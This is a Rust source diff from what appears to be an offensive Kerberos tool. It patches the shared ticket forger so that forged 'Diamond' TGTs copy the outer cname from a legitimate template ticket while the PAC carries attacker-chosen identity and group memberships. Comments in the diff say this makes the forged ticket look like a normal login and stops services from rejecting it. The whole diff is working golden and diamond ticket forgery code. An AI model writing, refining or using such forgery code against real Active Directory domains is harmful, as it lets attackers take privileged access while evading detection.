@@ -1068,6 +1068,15 @@ pub struct TicketTimestamps {
     pub starttime: Option<KerberosTime>,
     pub endtime: Option<KerberosTime>,
     pub renew_till: Option<KerberosTime>,
+    /// **1.4.8 audit fix:** Diamond ticket must inherit the outer `cname`
+    /// from the template TGT — otherwise the AP-REQ authenticator (which
+    /// uses `Tgt.cname`) mismatches the ticket, and every service returns
+    /// `KRB_AP_ERR_BADMATCH`. When `Some(pn)`, both the inner
+    /// `EncTicketPart.cname` and the returned `Tgt.cname` are set to `pn`
+    /// while the PAC still carries the attacker-chosen identity from
+    /// `id.user`. When `None`, everything falls back to `id.user` (Golden
+    /// ticket behaviour where cname and PAC identity match).
+    pub cname_template: Option<PrincipalName>,
 }
 
 /// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
@@ -1135,7 +1144,14 @@ fn forge_ticket_with_timestamps(
     // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
     let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
-    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()])?;
+    // Outer cname: Diamond ticket inherits from a legitimate TGT
+    // (`ts.cname_template`); Golden ticket uses the attacker-chosen
+    // identity (`id.user`). Whatever's here MUST also land on
+    // `Tgt.cname` below, or the AP-REQ authenticator mismatches.
+    let cname = ts
+        .cname_template
+        .clone()
+        .unwrap_or(principal(NT_PRINCIPAL, &[id.user.as_str()])?);
 
     // Ticket flags 0x40e10000: forwardable, proxiable, renewable, initial, pre-authent.
     let etp = EncTicketPart {
@@ -1247,6 +1263,14 @@ pub fn forge_diamond_tgt(
         starttime: etp.starttime.0.as_ref().map(|s| s.0.clone()),
         endtime: Some(etp.endtime.0.clone()),
         renew_till: etp.renew_till.0.as_ref().map(|s| s.0.clone()),
+        // 1.4.8 audit fix: inherit outer cname from the template. Without
+        // this, roast_spn / any client-side AP-REQ builds the authenticator
+        // with `Tgt.cname` = attacker-chosen and the ticket enc-part carries
+        // attacker-chosen too, but downstream ccache tools that mismatch
+        // header-vs-ticket cname get BADMATCH. Real Diamond ticket = outer
+        // cname is the template's (looks like a normal login for that user),
+        // PAC internally carries the attacker's group memberships.
+        cname_template: Some(etp.cname.0.clone()),
     };
     let realm_up = real.crealm.to_uppercase();
     forge_ticket_with_timestamps(
